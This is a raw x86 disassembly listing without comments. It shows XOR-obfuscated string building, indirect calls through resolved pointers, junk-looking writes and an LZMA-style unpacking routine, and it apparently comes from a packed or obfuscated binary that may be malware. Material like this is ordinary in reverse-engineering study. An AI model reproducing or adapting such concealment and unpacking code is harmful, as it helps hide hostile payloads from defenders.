  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	mov    fs,WORD PTR [ebx]
  4165c6:	ret    0xd7fe
  4165c9:	sbb    eax,0x249e4825
  4165ce:	stc    
  4165cf:	add    BYTE PTR [edx],dh
  4165d1:	adc    ecx,DWORD PTR [edi-0x16]
  4165d4:	add    DWORD PTR [eax],eax
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	inc    ebx
  4165d9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  4165dd:	jb     0x416651
  4165df:	outs   dx,BYTE PTR gs:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
